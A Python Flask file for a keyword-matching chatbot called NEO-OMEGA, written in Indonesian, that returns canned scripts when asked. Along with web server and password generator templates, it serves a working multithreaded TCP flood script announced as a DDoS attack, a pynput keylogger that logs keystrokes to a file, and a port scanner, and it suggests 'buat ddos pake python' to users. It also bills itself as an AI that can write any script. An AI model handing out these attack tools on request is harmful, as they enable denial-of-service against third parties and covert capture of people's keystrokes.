from flask import Flask, request, jsonify, render_template
import os
import random
import time

app = Flask(__name__)

# ============================================================
# MEMORY SEDERHANA (INGAT PERCAKAPAN TERAKHIR)
# ============================================================

last_conversation = {}

# ============================================================
# AI PINTAR (DETEKSI INTENT + BAHASA)
# ============================================================

def detect_language(text):
    text = text.lower()
    if "python" in text or "py" in text:
        return "python"
    if "javascript" in text or "js" in text or "node" in text:
        return "javascript"
    if "go" in text or "golang" in text:
        return "go"
    if "html" in text or "web" in text:
        return "html"
    if "php" in text:
        return "php"
    if "bash" in text or "shell" in text:
        return "bash"
    if "rust" in text:
        return "rust"
    if "c++" in text or "cpp" in text:
        return "cpp"
    if "java" in text:
        return "java"
    if "sql" in text:
        return "sql"
    return "python"

def detect_intent(text):
    text = text.lower()
    if "halo" in text or "hai" in text or "hey" in text:
        return "sapaan"
    if "siapa" in text or "nama" in text or "kamu" in text:
        return "siapa"
    if "buat" in text or "bikin" in text or "create" in text or "tulis" in text or "script" in text or "code" in text:
        return "generate"
    if "web server" in text or "flask" in text:
        return "webserver"
    if "ddos" in text or "attack" in text:
        return "ddos"
    if "keylog" in text:
        return "keylogger"
    if "port scan" in text:
        return "portscan"
    if "password" in text and ("gen" in text or "buat" in text):
        return "passwordgen"
    if "terima kasih" in text or "makasih" in text or "thanks" in text:
        return "thanks"
    if "apa itu" in text or "jelaskan" in text or "explain" in text:
        return "explain"
    return "general"

def generate_code(intent, language):
    if intent == "webserver" and language == "python":
        return '''
from flask import Flask
app = Flask(__name__)
@app.route('/')
def home():
    return "<h1>NEO-OMEGA WEB SERVER</h1>"
app.run(host='0.0.0.0', port=5000)
'''
    if intent == "webserver" and language == "javascript":
        return '''
const express = require('express')
const app = express()
app.get('/', (req, res) => res.send('NEO-OMEGA WEB SERVER'))
app.listen(3000, () => console.log('Server running on port 3000'))
'''
    if intent == "webserver" and language == "go":
        return '''
package main
import "fmt"
import "net/http"
func main() {
    http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
        fmt.Fprintf(w, "NEO-OMEGA WEB SERVER")
    })
    http.ListenAndServe(":8080", nil)
}
'''
    if intent == "webserver" and language == "html":
        return '''
<!DOCTYPE html>
<html>
<head><title>NEO-OMEGA</title></head>
<body><h1>NEO-OMEGA WEB SERVER</h1></body>
</html>
'''
    if intent == "ddos" and language == "python":
        return '''
import socket
import threading
target = input("Target IP: ")
port = int(input("Port: "))
def flood():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.send(b"GET / HTTP/1.1\\r\\n\\r\\n")
            s.close()
        except:
            pass
for _ in range(500):
    threading.Thread(target=flood).start()
print("DDoS attack started!")
'''
    if intent == "keylogger" and language == "python":
        return '''
from pynput import keyboard
log = ""
def on_press(key):
    global log
    try: log += key.char
    except: log += str(key)
    if len(log) > 100:
        with open("keylog.txt", "a") as f:
            f.write(log + "\\n")
        log = ""
listener = keyboard.Listener(on_press=on_press)
listener.start()
listener.join()
'''
    if intent == "portscan" and language == "python":
        return '''
import socket
def scan(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(1)
    result = s.connect_ex((ip, port))
    s.close()
    return result == 0
target = input("Target IP: ")
for p in range(1, 1025):
    if scan(target, p):
        print(f"Port {p} OPEN")
'''
    if intent == "passwordgen" and language == "python":
        return '''
import random, string
length = int(input("Panjang password: "))
password = ''.join(random.choices(string.ascii_letters + string.digits + "!@#$%^&*", k=length))
print(f"Password: {password}")
'''
    return f'''
print("NEO-OMEGA AI - Generated Code")
print(f"Intent: {intent}, Language: {language}")
print("Created by YATZZ")
'''

def jawab_ai(pesan):
    global last_conversation
    lang = detect_language(pesan)
    intent = detect_intent(pesan)
    
    # Simpan percakapan
    last_conversation = {"pesan": pesan, "intent": intent, "lang": lang}
    
    if intent == "sapaan":
        sapaan = random.choice([
            "Halo juga! Saya NEO-OMEGA, siap membantu anda.",
            "Hai! Ada yang bisa saya bantu?",
            "Hey! Saya NEO-OMEGA, silahkan tanya apa saja."
        ])
        return sapaan
    
    if intent == "siapa":
        return "Saya NEO-OMEGA, AI buatan TUAN YATZZ. Saya bisa membantu membuat script apapun!"
    
    if intent == "thanks":
        return "Sama-sama! Senang bisa membantu. Kalo butuh bantuan lagi, tinggal chat aja."
    
    if intent == "explain":
        return "Saya bisa membuat script apapun. Cukup tulis: 'buat [nama script] pake [bahasa]'. Contoh: 'buat web server pake python'"
    
    if intent == "generate":
        code = generate_code(intent, lang)
        return f"Saya buatkan script {lang.upper()} untuk permintaan anda:\n\n```{lang}\n{code}\n```\n\nCopy-paste kode di atas dan jalankan!"
    
    if intent == "webserver":
        code = generate_code("webserver", lang)
        return f"Saya buatkan web server dengan {lang.upper()}:\n\n```{lang}\n{code}\n```"
    
    if intent == "ddos":
        code = generate_code("ddos", lang)
        return f"Saya buatkan script DDoS dengan {lang.upper()}:\n\n```{lang}\n{code}\n```"
    
    if intent == "keylogger":
        code = generate_code("keylogger", lang)
        return f"Saya buatkan keylogger dengan {lang.upper()}:\n\n```{lang}\n{code}\n```"
    
    if intent == "portscan":
        code = generate_code("portscan", lang)
        return f"Saya buatkan port scanner dengan {lang.upper()}:\n\n```{lang}\n{code}\n```"
    
    if intent == "passwordgen":
        code = generate_code("passwordgen", lang)
        return f"Saya buatkan password generator dengan {lang.upper()}:\n\n```{lang}\n{code}\n```"
    
    return f"Saya NEO-OMEGA. Coba tanya: 'halo', 'siapa kamu', 'buat web server pake python', atau 'buat ddos pake python'."

# ============================================================
# ROUTE
# ============================================================

@app.route('/')
def index():
    return render_template('chat.html')

@app.route('/api/chat', methods=['POST'])
def chat():
    data = request.get_json()
    pesan = data.get('message', '').strip()
    
    if not pesan:
        return jsonify({'response': 'Tulis sesuatu!'})
    
    balasan = jawab_ai(pesan)
    
    return jsonify({
        'response': balasan,
        'code': '',
        'output': ''
    })

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
